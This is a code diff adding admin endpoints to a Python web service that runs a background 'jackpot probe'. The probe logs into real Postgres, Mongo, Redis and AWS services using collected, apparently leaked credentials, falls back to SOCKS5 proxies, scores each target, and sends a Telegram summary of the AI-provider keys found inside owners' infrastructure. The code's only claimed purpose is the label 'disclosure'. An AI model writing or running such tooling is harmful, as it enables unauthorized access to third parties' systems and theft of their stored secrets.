@@ -1074,6 +1074,83 @@ async def _do_reclassify_infra() -> dict:
     return counters
 
 
+_JACKPOT_RUNNING: bool = False
+_JACKPOT_LAST: dict = {}
+
+
+@app.post("/admin/jackpot_probe")
+async def admin_jackpot_probe(
+    limit: int | None = None,
+    authorization: str | None = Header(default=None),
+):
+    """Active jackpot probe — for each is_validated=1 infra cred, attempt
+    to authenticate against the actual service and inventory AI-provider
+    keys hidden inside (DB rows, AWS SSM/SecretsManager, etc).
+
+    Implements postgres / mongo / redis / aws probes. Direct connect first;
+    on failure, TCP reachability via Evomi SOCKS5 (US, DE) — if proxy works
+    we mark connect_route='proxy:XX' and skip the actual data-probe (DB
+    protocol via SOCKS5 is fragile).
+
+    Saves to infra_findings.jackpot_data (JSON) + jackpot_score (0-100) +
+    connect_route. Top disclosure targets: score >= 60.
+
+    Background task. Poll /admin/jackpot_status. Optional ?limit=N to
+    process only the most recent N validated rows (default: all).
+    """
+    _check_admin(authorization)
+    global _JACKPOT_RUNNING
+    if _JACKPOT_RUNNING:
+        return {"ok": False, "error": "already running", "last": _JACKPOT_LAST}
+
+    async def _bg():
+        global _JACKPOT_RUNNING, _JACKPOT_LAST
+        _JACKPOT_RUNNING = True
+        try:
+            from infra_jackpot import run_jackpot_cycle
+            from notifier import _send
+            counters = await run_jackpot_cycle(limit=limit)
+            _JACKPOT_LAST = counters
+            # Telegram digest
+            try:
+                lines = [
+                    "💎 <b>Infra jackpot probe done</b>",
+                    f"Total validated rows: {counters['total']}",
+                    f"  • probed OK: {counters['probed']}",
+                    f"  • via Evomi proxy (TCP only): {counters['via_proxy']}",
+                    f"  • errors: {counters['errors']}",
+                    "",
+                    f"🚨 With AI keys INSIDE infra: {counters['with_keys']}",
+                    f"💰 Total keys discovered: {counters['total_keys_found']}",
+                    f"🎯 JACKPOT-critical (score≥60): {counters['jackpot_critical']}",
+                ]
+                if counters['by_provider']:
+                    lines.append("")
+                    lines.append("By provider (keys found INSIDE owners' infra):")
+                    for prov, n in sorted(counters['by_provider'].items(),
+                                           key=lambda x: -x[1]):
+                        lines.append(f"  • {prov}: {n}")
+                lines.append("")
+                lines.append("→ /infra?risk=critical → sort by jackpot_score for disclosure")
+                await _send("\n".join(lines))
+            except Exception as e:
+                log.error("jackpot tg digest err: %s", e)
+        except Exception as e:
+            log.error("jackpot probe crashed: %s", e)
+            _JACKPOT_LAST = {"error": str(e)[:200]}
+        finally:
+            _JACKPOT_RUNNING = False
+
+    asyncio.create_task(_bg(), name="jackpot_probe")
+    return {"ok": True, "message": "jackpot probe started — poll /admin/jackpot_status"}
+
+
+@app.get("/admin/jackpot_status")
+async def admin_jackpot_status(authorization: str | None = Header(default=None)):
+    _check_admin(authorization)
+    return {"running": _JACKPOT_RUNNING, "last": _JACKPOT_LAST}
+
+
 @app.post("/admin/cleanup_authors")
 async def admin_cleanup_authors(authorization: str | None = Header(default=None)):
     """One-time cleanup — delete watched_authors rows with logins that don't
